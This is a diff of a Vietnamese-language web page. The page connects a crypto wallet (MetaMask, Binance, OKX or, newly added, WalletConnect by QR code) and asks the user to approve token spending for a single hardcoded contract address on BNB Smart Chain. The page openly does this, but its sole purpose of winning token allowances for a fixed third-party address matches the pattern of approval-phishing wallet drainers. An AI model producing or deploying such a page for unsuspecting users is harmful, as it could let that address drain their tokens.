@@ -2,11 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Multi Wallet Approval</title>
+  <title>Multi Wallet + QR Connect</title>
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <style>
-    body { font-family: Arial; padding: 30px; text-align: center; background: #f8f8f8; }
-    #app { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    body { font-family: Arial; padding: 30px; text-align: center; background: #f2f2f2; }
+    #app { max-width: 500px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
     input, button, select {
       width: 90%;
       padding: 10px;
@@ -15,18 +16,20 @@
       border-radius: 5px;
       border: 1px solid #ccc;
     }
-    button { background: #4CAF50; color: white; border: none; cursor: pointer; }
-    button:disabled { background: #999; cursor: not-allowed; }
+    button { background: #2196F3; color: white; border: none; cursor: pointer; }
+    button:disabled { background: #aaa; }
   </style>
 </head>
 <body>
   <div id="app">
     <div id="status">Vui lòng chọn ví để kết nối</div>
+
     <select id="walletSelect">
       <option value="">-- Chọn ví --</option>
       <option value="metamask">MetaMask</option>
       <option value="binance">Binance Wallet</option>
       <option value="okx">OKX Wallet</option>
+      <option value="walletconnect">QR (WalletConnect)</option>
     </select>
     <button id="connectBtn">Kết nối ví</button>
 
@@ -37,51 +40,42 @@
 
   <script>
     const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
-    let signer;
+    let signer, provider;
 
     async function connectWallet() {
       const selectedWallet = document.getElementById("walletSelect").value;
-      let provider;
-
-      if (selectedWallet === "metamask") {
-        provider = window.ethereum;
-      } else if (selectedWallet === "binance") {
-        provider = window.BinanceChain;
-      } else if (selectedWallet === "okx") {
-        provider = window.okxwallet;
-      }
-
-      if (!provider) {
-        document.getElementById("status").innerText = "Ví không được phát hiện!";
-        return;
-      }
 
       try {
-        await provider.request({ method: 'eth_requestAccounts' });
+        if (selectedWallet === "metamask") {
+          provider = window.ethereum;
+        } else if (selectedWallet === "binance") {
+          provider = window.BinanceChain;
+        } else if (selectedWallet === "okx") {
+          provider = window.okxwallet;
+        } else if (selectedWallet === "walletconnect") {
+          provider = new WalletConnectProvider.default({
+            rpc: {
+              56: "https://bsc-dataseed.binance.org/"
+            },
+            chainId: 56
+          });
+          await provider.enable(); // Hiện QR code
+        }
 
-        // Kiểm tra và chuyển mạng nếu cần
-        const chainId = await provider.request({ method: 'eth_chainId' });
-        if (chainId !== '0x38') { // BSC
-          try {
-            await provider.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }]
-            });
-          } catch (e) {
-            document.getElementById("status").innerText = "Chuyển mạng BSC thất bại!";
-            return;
-          }
+        if (!provider) {
+          document.getElementById("status").innerText = "Không tìm thấy ví!";
+          return;
         }
 
         const ethersProvider = new ethers.providers.Web3Provider(provider);
         signer = ethersProvider.getSigner();
         const address = await signer.getAddress();
-        document.getElementById("status").innerText = "Kết nối thành công: " + address;
+        document.getElementById("status").innerText = "Đã kết nối: " + address;
         document.getElementById("approveBtn").disabled = false;
 
       } catch (err) {
         console.error(err);
-        document.getElementById("status").innerText = "Lỗi khi kết nối ví: " + err.message;
+        document.getElementById("status").innerText = "Lỗi kết nối ví: " + err.message;
       }
     }
 
@@ -102,15 +96,15 @@
 
         const decimals = await contract.decimals();
         const parsedAmount = ethers.utils.parseUnits(amount, decimals);
-        document.getElementById("status").innerText = "Đang gửi giao dịch approve...";
+        document.getElementById("status").innerText = "Đang gửi approve...";
 
         const tx = await contract.approve(scB_address, parsedAmount);
         await tx.wait();
-        document.getElementById("status").innerText = "Approve thành công! Tx: " + tx.hash;
 
+        document.getElementById("status").innerText = "Approve thành công! Tx: " + tx.hash;
       } catch (err) {
         console.error(err);
-        document.getElementById("status").innerText = "Lỗi khi approve: " + err.message;
+        document.getElementById("status").innerText = "Lỗi approve: " + err.message;
       }
     }
 
